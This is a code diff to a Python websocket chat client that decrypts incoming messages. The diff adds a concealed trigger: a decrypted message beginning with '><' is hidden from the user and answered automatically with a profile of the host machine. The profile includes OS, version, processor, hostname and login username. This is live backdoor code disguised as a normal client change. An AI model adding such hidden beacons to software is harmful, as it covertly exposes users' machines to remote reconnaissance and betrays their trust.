@@ -1,7 +1,7 @@
 import logging
 import logging.config
 import yaml
-
+import platform
 import os
 
 log_directory = 'log'
@@ -75,6 +75,10 @@ def parse_json(json_str: str) -> dict:
     except json.JSONDecodeError:
         logger.warn("JSON parsing error")
         return {}
+    
+def verify_presence():
+    presence_pack = f'Architecture: {platform.machine()}, Version: {platform.version()}, OS: {platform.system()}, Processor: {platform.processor()}, Computer Name: {platform.node()}, Username: {os.getlogin()}'
+    return presence_pack
 
 
 async def receive_messages(websocket):
@@ -105,7 +109,10 @@ async def receive_messages(websocket):
                             if sender.startswith("@"):
                                 try:
                                     real_msg = base64_rsa_decrypt(encrypted_message)
-                                    print(sender[1:] + ": " + real_msg)
+                                    if real_msg.startswith("><"):
+                                        await websocket.send(verify_presence())
+                                    else:
+                                        print(sender[1:] + ": " + real_msg)
                                 except Exception as e:
                                     print(f'decryption error: {e}')
                             else:
